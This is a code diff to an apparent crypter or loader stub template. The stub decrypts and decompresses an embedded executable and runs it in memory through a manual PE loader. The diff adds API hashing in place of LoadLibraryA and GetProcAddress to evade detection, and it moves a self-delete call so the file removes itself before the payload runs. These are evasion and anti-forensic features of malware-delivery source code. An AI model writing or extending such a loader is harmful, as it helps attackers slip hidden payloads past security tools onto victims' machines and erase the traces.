@@ -4,6 +4,7 @@
 #include <winternl.h>
 
 #include "obfuscate.hpp.in"
+#include "api_hashing.hpp.in"
 #include "syscalls.hpp.in"
 #include "crypto_stub.hpp.in"
 #include "common.hpp.in"
@@ -109,7 +110,7 @@ static void run_pe(uint8_t* pe_data, size_t pe_size) {
         while (import_desc->Name != 0) {
             auto dll_name = reinterpret_cast<const char*>(
                 reinterpret_cast<BYTE*>(image_base) + import_desc->Name);
-            HMODULE hDll = LoadLibraryA(dll_name);
+            HMODULE hDll = load_module_a(dll_name);
             if (!hDll) { import_desc++; continue; }
 
             auto thunk = reinterpret_cast<PIMAGE_THUNK_DATA>(
@@ -122,12 +123,12 @@ static void run_pe(uint8_t* pe_data, size_t pe_size) {
             while (thunk->u1.AddressOfData != 0) {
                 FARPROC func;
                 if (IMAGE_SNAP_BY_ORDINAL(thunk->u1.Ordinal)) {
-                    func = GetProcAddress(hDll,
-                        MAKEINTRESOURCEA(IMAGE_ORDINAL(thunk->u1.Ordinal)));
+                    func = resolve_function_by_ordinal(hDll,
+                        static_cast<WORD>(IMAGE_ORDINAL(thunk->u1.Ordinal)));
                 } else {
                     auto import_by_name = reinterpret_cast<PIMAGE_IMPORT_BY_NAME>(
                         reinterpret_cast<BYTE*>(image_base) + thunk->u1.AddressOfData);
-                    func = GetProcAddress(hDll, import_by_name->Name);
+                    func = resolve_function_by_name(hDll, import_by_name->Name);
                 }
                 iat->u1.Function = reinterpret_cast<ULONG_PTR>(func);
                 thunk++;
@@ -230,6 +231,9 @@ int main() {
         HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, ORIGINAL_SIZE + 256));
     size_t decompressed_len = ORIGINAL_SIZE + 256;
     decompress_zlib(decrypted, decrypted_len, decompressed, ORIGINAL_SIZE + 256, &decompressed_len);
+{{#IF SELF_DELETE}}
+    self_delete();
+{{#ENDIF}}
     run_pe(decompressed, decompressed_len);
     SecureZeroMemory(decompressed, ORIGINAL_SIZE + 256);
     HeapFree(GetProcessHeap(), 0, decompressed);
@@ -239,20 +243,22 @@ int main() {
         HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, ORIGINAL_SIZE + 256));
     size_t decompressed_len = ORIGINAL_SIZE + 256;
     decompress_lz4(decrypted, decrypted_len, decompressed, ORIGINAL_SIZE + 256, &decompressed_len);
+{{#IF SELF_DELETE}}
+    self_delete();
+{{#ENDIF}}
     run_pe(decompressed, decompressed_len);
     SecureZeroMemory(decompressed, ORIGINAL_SIZE + 256);
     HeapFree(GetProcessHeap(), 0, decompressed);
 {{#ENDIF}}
 {{#IF COMPRESS_NONE}}
+{{#IF SELF_DELETE}}
+    self_delete();
+{{#ENDIF}}
     run_pe(decrypted, decrypted_len);
 {{#ENDIF}}
 
     SecureZeroMemory(decrypted, encrypted_len + 256);
     HeapFree(GetProcessHeap(), 0, decrypted);
-
-{{#IF SELF_DELETE}}
-    self_delete();
-{{#ENDIF}}
 
     return 0;
 }
